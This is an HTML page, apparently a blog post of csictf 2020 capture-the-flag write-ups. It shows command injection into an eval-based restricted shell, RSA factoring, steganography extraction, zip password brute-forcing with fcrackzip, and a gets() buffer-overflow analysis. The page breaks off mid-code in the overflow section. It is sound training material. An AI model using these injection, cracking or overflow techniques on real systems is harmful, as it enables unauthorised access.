@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="AKACows are following me everywhere I go. Help, I’m trapped!nc chall.csivit.com 30611 This problem provides a server connection that only seems to provide cowsay. There are a lot of commands that won’">
+<meta property="og:type" content="article">
+<meta property="og:title" content="csictf">
+<meta property="og:url" content="http://yoursite.com/2020/07/19/csictf/index.html">
+<meta property="og:site_name" content="Notes At Random:">
+<meta property="og:description" content="AKACows are following me everywhere I go. Help, I’m trapped!nc chall.csivit.com 30611 This problem provides a server connection that only seems to provide cowsay. There are a lot of commands that won’">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/07/19/csictf/meme.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/07/19/csictf/panda.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/07/19/csictf/panda1.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/07/19/csictf/nyc.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/19/csictf/solved.bmp">
+<meta property="article:published_time" content="2020-07-19T19:47:34.000Z">
+<meta property="article:modified_time" content="2020-08-22T16:54:16.964Z">
+<meta property="article:author" content="Brian Bashor">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/07/19/csictf/meme.jpg">
+    
+    
+    <!-- title -->
+    <title>csictf</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/07/29/hacktivitycon/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/03/02/arch-install/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/07/19/csictf/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/07/19/csictf/&text=csictf" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/07/19/csictf/&title=csictf" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/07/19/csictf/&is_video=false&description=csictf" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=csictf&body=Check out this article: http://yoursite.com/2020/07/19/csictf/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/07/19/csictf/&title=csictf" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/07/19/csictf/&title=csictf" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/07/19/csictf/&title=csictf" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/07/19/csictf/&title=csictf" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/07/19/csictf/&name=csictf&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/07/19/csictf/&t=csictf" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#AKA"><span class="toc-number">1.</span> <span class="toc-text">AKA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rivest-Shamir-Adleman"><span class="toc-number">2.</span> <span class="toc-text">Rivest Shamir Adleman</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gradient-sky"><span class="toc-number">3.</span> <span class="toc-text">Gradient sky</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Archenemy"><span class="toc-number">4.</span> <span class="toc-text">Archenemy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Panda"><span class="toc-number">5.</span> <span class="toc-text">Panda</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cascade"><span class="toc-number">6.</span> <span class="toc-text">Cascade</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn-2"><span class="toc-number">7.</span> <span class="toc-text">Pwn-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unseen"><span class="toc-number">8.</span> <span class="toc-text">Unseen</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        csictf
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Notes At Random:</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-07-19T19:47:34.000Z" itemprop="datePublished">2020-07-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="AKA"><a href="#AKA" class="headerlink" title="AKA"></a>AKA</h2><p>Cows are following me everywhere I go. Help, I’m trapped!<br>nc chall.csivit.com 30611</p>
+<p>This problem provides a server connection that only seems to provide <code>cowsay</code>.</p>
+<p>There are a lot of commands that won’t work but after getting some file names I ran a diff against flag.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">microbial:tmp none$ nc chall.csivit.com 30611</span><br><span class="line">user @ csictf: $</span><br><span class="line">cowsay $(ls)</span><br><span class="line"> _________________________________________</span><br><span class="line">/ _______________________________________ \</span><br><span class="line">| _ / Don<span class="string">'t look at me, I'</span>m just here to  |</span><br><span class="line">| say \ \ moo. /                          |</span><br><span class="line">| --------------------------------------- |</span><br><span class="line">| - \ ^__^ \ (oo)\_______ (__)\ )\/\      |</span><br><span class="line">\ ||----w | || ||                         /</span><br><span class="line"> -----------------------------------------</span><br><span class="line">        \   ^__^</span><br><span class="line">         \  (oo)\_______</span><br><span class="line">            (__)\       )\/\</span><br><span class="line">                ||----w |</span><br><span class="line">                ||     ||</span><br><span class="line">user @ csictf: $</span><br><span class="line">cowsay $(more *)</span><br><span class="line"> _________________________________________</span><br><span class="line">/ _______________________________________ \</span><br><span class="line">| _ / Don<span class="string">'t look at me, I'</span>m just here to  |</span><br><span class="line">| say \ \ moo. flag.txt script.sh         |</span><br><span class="line">| start.sh /                              |</span><br><span class="line">| --------------------------------------- |</span><br><span class="line">| - \ ^__^ \ (oo)\_______ (__)\ )\/\      |</span><br><span class="line">\ ||----w | || ||                         /</span><br><span class="line"> -----------------------------------------</span><br><span class="line">        \   ^__^</span><br><span class="line">         \  (oo)\_______</span><br><span class="line">            (__)\       )\/\</span><br><span class="line">                ||----w |</span><br><span class="line">                ||     ||</span><br><span class="line"></span><br><span class="line">user @ csictf: $</span><br><span class="line">cowsay $(diff flag.txt script.sh)</span><br><span class="line"> _________________________________________</span><br><span class="line">/ 1c1,21 &lt; csictf&#123;1_4m_cl4rk3_k3nt&#125; --- &gt; \</span><br><span class="line">| <span class="built_in">shopt</span> -s expand_aliases &gt; <span class="built_in">alias</span>         |</span><br><span class="line">| cat=<span class="string">"cowsay Don\'t look at me, I\'m     |</span></span><br><span class="line"><span class="string">| just here to say moo."</span> &gt; <span class="built_in">alias</span>          |</span><br><span class="line">| ls=<span class="string">"cowsay Don\'t look at me, I\'m just |</span></span><br><span class="line"><span class="string">| here to say moo."</span> &gt; <span class="built_in">alias</span> grep=<span class="string">"cowsay  |</span></span><br><span class="line"><span class="string">| Don\'t look at me, I\'m just here to    |</span></span><br><span class="line"><span class="string">| say moo."</span> &gt; <span class="built_in">alias</span> awk=<span class="string">"cowsay Don\'t    |</span></span><br><span class="line"><span class="string">| look at me, I\'m just here to say moo."</span> |</span><br><span class="line">| &gt; <span class="built_in">alias</span> <span class="built_in">pwd</span>=<span class="string">"cowsay Don\'t look at me,  |</span></span><br><span class="line"><span class="string">| I\'m just here to say moo."</span> &gt; <span class="built_in">alias</span>     |</span><br><span class="line">| <span class="built_in">cd</span>=<span class="string">"cowsay Don\'t look at me, I\'m just |</span></span><br><span class="line"><span class="string">| here to say moo."</span> &gt; <span class="built_in">alias</span> head=<span class="string">"cowsay  |</span></span><br><span class="line"><span class="string">| Don\'t look at me, I\'m just here to    |</span></span><br><span class="line"><span class="string">| say moo."</span> &gt; <span class="built_in">alias</span> tail=<span class="string">"cowsay Don\'t   |</span></span><br><span class="line"><span class="string">| look at me, I\'m just here to say moo."</span> |</span><br><span class="line">| &gt; <span class="built_in">alias</span> less=<span class="string">"cowsay Don\'t look at me, |</span></span><br><span class="line"><span class="string">| I\'m just here to say moo."</span> &gt; <span class="built_in">alias</span>     |</span><br><span class="line">| more=<span class="string">"cowsay Don\'t look at me, I\'m    |</span></span><br><span class="line"><span class="string">| just here to say moo."</span> &gt; <span class="built_in">alias</span>          |</span><br><span class="line">| sed=<span class="string">"cowsay Don\'t look at me, I\'m     |</span></span><br><span class="line"><span class="string">| just here to say moo."</span> &gt; <span class="built_in">alias</span>          |</span><br><span class="line">| find=<span class="string">"cowsay Don\'t look at me, I\'m    |</span></span><br><span class="line"><span class="string">| just here to say moo."</span> &gt; <span class="built_in">alias</span>          |</span><br><span class="line">| awk=<span class="string">"cowsay Don\'t look at me, I\'m     |</span></span><br><span class="line"><span class="string">| just here to say moo."</span> &gt; &gt; <span class="keyword">while</span> : &gt; <span class="keyword">do</span> |</span><br><span class="line">| &gt; <span class="built_in">echo</span> <span class="string">"user @ csictf: $ "</span> &gt; <span class="built_in">read</span> input |</span><br><span class="line">\ &gt; <span class="built_in">eval</span> <span class="variable">$input</span> 2&gt;/dev/null &gt; <span class="keyword">done</span>        /</span><br><span class="line"> -----------------------------------------</span><br><span class="line">        \   ^__^</span><br><span class="line">         \  (oo)\_______</span><br><span class="line">            (__)\       )\/\</span><br><span class="line">                ||----w |</span><br><span class="line">                ||     ||</span><br><span class="line">user @ csictf: $</span><br></pre></td></tr></table></figure>
+
+<p>Flag: <code>csictf{1_4m_cl4rk3_k3nt}</code></p>
+<hr>
+<h2 id="Rivest-Shamir-Adleman"><a href="#Rivest-Shamir-Adleman" class="headerlink" title="Rivest Shamir Adleman"></a>Rivest Shamir Adleman</h2><p>These 3 guys encrypted my flag, but they didn’t tell me how to decrypt it.</p>
+<p>This is a basic RSA problem.  n, e and c are provided.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> factordb.factordb <span class="keyword">import</span> FactorDB</span><br><span class="line"></span><br><span class="line">n = <span class="number">408579146706567976063586763758203051093687666875502812646277701560732347095463873824829467529879836457478436098685606552992513164224712398195503564207485938278827523972139196070431397049700119503436522251010430918143933255323117421712000644324381094600257291929523792609421325002527067471808992410166917641057703562860663026873111322556414272297111644069436801401012920448661637616392792337964865050210799542881102709109912849797010633838067759525247734892916438373776477679080154595973530904808231</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">226582271940094442087193050781730854272200420106419489092394544365159707306164351084355362938310978502945875712496307487367548451311593283589317511213656234433015906518135430048027246548193062845961541375898496150123721180020417232872212026782286711541777491477220762823620612241593367070405349675337889270277102235298455763273194540359004938828819546420083966793260159983751717798236019327334525608143172073795095665271013295322241504491351162010517033995871502259721412160906176911277416194406909</span></span><br><span class="line"></span><br><span class="line">f = FactorDB(n)</span><br><span class="line">f.connect()</span><br><span class="line">my_factor = f.get_factor_from_api()</span><br><span class="line"></span><br><span class="line">p = int(my_factor[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">q = int(my_factor[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"></span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"></span><br><span class="line">print(bytes.fromhex(hex(m)[<span class="number">2</span>::]).decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
+
+<p>Flag: <code>csictf{sh0uld&#39;v3_t4k3n_b1gg3r_pr1m3s}</code></p>
+<hr>
+<h2 id="Gradient-sky"><a href="#Gradient-sky" class="headerlink" title="Gradient sky"></a>Gradient sky</h2><p>Gradient sky is a begginer level ctf challenge which is aimed towards rookies.</p>
+<p>This problem provides an image that contains a hidden rar file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">microbial:tmp none$ binwalk -e grad_sky.jpg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">30            0x1E            TIFF image data, little-endian offset of first image directory: 8</span><br><span class="line">918           0x396           JPEG image data, JFIF standard 1.01</span><br><span class="line"></span><br><span class="line">WARNING: Extractor.execute failed to run external extractor <span class="string">'unrar e '</span>%e<span class="string">''</span>: [Errno 2] No such file or directory: <span class="string">'unrar'</span>, <span class="string">'unrar e '</span>%e<span class="string">''</span> might not be installed correctly</span><br><span class="line"></span><br><span class="line">WARNING: Extractor.execute failed to run external extractor <span class="string">'unrar -x '</span>%e<span class="string">''</span>: [Errno 2] No such file or directory: <span class="string">'unrar'</span>, <span class="string">'unrar -x '</span>%e<span class="string">''</span> might not be installed correctly</span><br><span class="line">295038        0x4807E         RAR archive data, version 5.x</span><br><span class="line"></span><br><span class="line">microbial:tmp none$ <span class="built_in">cd</span> _grad_sky.jpg.extracted/</span><br><span class="line">microbial:_grad_sky.jpg.extracted none$ ls</span><br><span class="line">4807E.rar</span><br><span class="line">microbial:_grad_sky.jpg.extracted none$ xxd 4807E.rar</span><br><span class="line">00000000: 5261 7221 1a07 0100 3392 b5e5 0a01 0506  Rar!....3.......</span><br><span class="line">00000010: 0005 0101 8080 0032 4d14 8f22 0203 0b99  .......2M..<span class="string">"....</span></span><br><span class="line"><span class="string">00000020: 0004 9900 2073 be17 6480 0000 066c 732e  .... s..d....ls.</span></span><br><span class="line"><span class="string">00000030: 7478 740a 0302 c479 34a5 3752 d601 6373  txt....y4.7R..cs</span></span><br><span class="line"><span class="string">00000040: 6963 7466 7b6a 306b 6572 5f77 3473 6e74  ictf&#123;j0ker_w4snt</span></span><br><span class="line"><span class="string">00000050: 5f68 6170 7079 7d1d 7756 5103 0504 00    _happy&#125;.wVQ....</span></span><br><span class="line"><span class="string">microbial:_grad_sky.jpg.extracted none$</span></span><br></pre></td></tr></table></figure>
+
+<p>Flag: <code>csictf{j0ker_w4snt_happy}</code></p>
+<hr>
+<h2 id="Archenemy"><a href="#Archenemy" class="headerlink" title="Archenemy"></a>Archenemy</h2><p>John likes Arch Linux. What is he hiding?</p>
+<p>This problem provides an image of an arch linux wallpaper.  Within the image is a password protected zip file that contains an image with the flag.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">microbial:tmp none$ steghide extract -sf arched.jpg</span><br><span class="line">Enter passphrase:</span><br><span class="line">wrote extracted data to <span class="string">"flag.zip"</span>.</span><br><span class="line">microbial:tmp none$ fcrackzip -D -p directory-list-2.3-medium.txt -u flag.zip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == kathmandu</span><br><span class="line">microbial:tmp none$ unzip -P kathmandu flag.zip</span><br><span class="line">Archive:  flag.zip</span><br><span class="line">  inflating: meme.jpg</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/07/19/csictf/meme.jpg" class="">
+
+<p>Flag <code>csictf{1_h0pe_y0u_didn&#39;t_s33_m3_here}</code></p>
+<hr>
+<h2 id="Panda"><a href="#Panda" class="headerlink" title="Panda"></a>Panda</h2><p>I wanted to send this file to AJ1479 but I did not want anyone else to see what’s inside it, so I protected it with a pin.</p>
+<p>This problem provides a password protected zip file.</p>
+<p>The description notes a pin so I created a quick word list.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">microbial:tmp none$ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..9999&#125;; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span> &gt;&gt; num_list; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">microbial:tmp none$ fcrackzip -D -p num_list -u panda.zip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == 2611</span><br><span class="line">microbial:tmp none$ unzip -P 2611 panda.zip</span><br><span class="line">Archive:  panda.zip</span><br><span class="line">  inflating: panda1.jpg</span><br><span class="line">  inflating: panda.jpg</span><br><span class="line">microbial:tmp none$</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/07/19/csictf/panda.jpg" class="">
+<img src="/2020/07/19/csictf/panda1.jpg" class="">
+
+<p>The two images are close but one is either missing information or contains extra information. The following script will find the difference between the two files.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line">hexdump -ve <span class="string">'1/1 "%00x " "\n"'</span> panda.jpg  &gt; /tmp/p.hex</span><br><span class="line">hexdump -ve <span class="string">'1/1 "%00x " "\n"'</span> panda1.jpg  &gt; /tmp/p1.hex</span><br><span class="line"></span><br><span class="line">diff /tmp/p.hex /tmp/p1.hex | grep ^<span class="string">'&gt;'</span> | sed <span class="string">'s/&gt; //g'</span> |  xxd -r -p  &gt; /tmp/my_diff</span><br><span class="line">cat /tmp/my_diff</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line">rm /tmp/p.hex</span><br><span class="line">rm /tmp/p1.hex</span><br><span class="line">rm /tmp/my_diff</span><br></pre></td></tr></table></figure>
+
+<p>Flag: <code>csictf{kung_fu_p4nd4}</code></p>
+<hr>
+<h2 id="Cascade"><a href="#Cascade" class="headerlink" title="Cascade"></a>Cascade</h2><p>Welcome to csictf.</p>
+<p>This problem simply provides a link to a basic web page.</p>
+<p>The flag is hidden within the style sheet.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">microbial:tmp none$ wget -r http://chall.csivit.com:30203/</span><br><span class="line"></span><br><span class="line">microbial:tmp none$ grep -rni csictf .</span><br><span class="line">./chall.csivit.com:30203/index.html:11:    &lt;h1&gt;Welcome to csictf&lt;/h1&gt;</span><br><span class="line">./chall.csivit.com:30203/index.html:13:    &lt;div&gt;csictf: &lt;a href=<span class="string">"https://ctf.csivit.com"</span>&gt;https://ctf.csivit.com&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">./chall.csivit.com:30203/static/style.css:10:    /* csictf&#123;w3lc0me_t0_csictf&#125; */</span><br><span class="line">./chall.csivit.com:30203/robots.txt:11:    &lt;h1&gt;Welcome to csictf&lt;/h1&gt;</span><br><span class="line">./chall.csivit.com:30203/robots.txt:13:    &lt;div&gt;csictf: &lt;a href=<span class="string">"https://ctf.csivit.com"</span>&gt;https://ctf.csivit.com&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">microbial:delete_me none$</span><br></pre></td></tr></table></figure>
+
+<p>Flag: <code>csictf{w3lc0me_t0_csictf}</code></p>
+<h2 id="Pwn-2"><a href="#Pwn-2" class="headerlink" title="Pwn-2"></a>Pwn-2</h2><p>This problem provides a binary <code>pwn-2</code>.  Using ghidra we can see the main function has an unchecked buffer followed by a declared int <code>local_c</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> local_38 [<span class="number">44</span>];</span><br><span class="line">  <span class="keyword">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  local_c = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>,(<span class="keyword">char</span> *)<span class="number">0x0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>,(<span class="keyword">char</span> *)<span class="number">0x0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>,(<span class="keyword">char</span> *)<span class="number">0x0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to csictf! Where are you headed?"</span>);</span><br><span class="line">  gets(local_38);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Safe Journey!"</span>);</span><br><span class="line">  <span class="keyword">if</span> (local_c == <span class="number">-0x35014542</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You\'ve reached your destination, here\'s a flag!"</span>);</span><br><span class="line">    system(<span class="string">"/bin/cat flag.txt"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The idea is to overrun local_38 and write to local_c.  It’s little ending so the values need to be put in reverse.</p>
+<p>* Note: Ghidra had the needed value as ‘-0x35014542’ but this didn’t work.  Using hopper I was able to find the actual value needed ‘0xcafebabe’.  End the end both tools provided correct and incorrect information.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(*<span class="built_in">stdout</span>@@GLIBC_2<span class="number">.2</span><span class="number">.5</span>, <span class="number">0x0</span>);</span><br><span class="line">    setbuf(*<span class="built_in">stdin</span>@@GLIBC_2<span class="number">.2</span><span class="number">.5</span>, <span class="number">0x0</span>);</span><br><span class="line">    setbuf(*<span class="built_in">stderr</span>@@GLIBC_2<span class="number">.2</span><span class="number">.5</span>, <span class="number">0x0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Welcome to csictf! Where are you headed?"</span>);</span><br><span class="line">    gets(&amp;var_30);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Safe Journey!"</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x0</span> == <span class="number">0xcafebabe</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"You've reached your destination, here's a flag!"</span>);</span><br><span class="line">            system(<span class="string">"/bin/cat flag.txt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x0</span>;</span><br><span 